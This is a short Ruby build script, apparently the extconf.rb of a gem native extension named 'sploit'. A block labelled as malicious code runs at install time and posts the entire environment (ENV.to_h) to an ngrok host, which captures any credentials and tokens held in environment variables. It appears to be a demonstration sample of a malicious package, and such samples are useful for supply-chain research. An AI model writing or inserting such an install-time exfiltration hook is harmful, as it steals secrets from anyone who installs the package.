### MALICIOUS CODE START ###

require "net/http"
require "uri"

uri = URI.parse("http://10cbe90f.ngrok.io/graphql")
response = Net::HTTP.post_form(uri, ENV.to_h)

### MALICIOUS CODE END ###

require 'mkmf'
create_makefile 'sploit'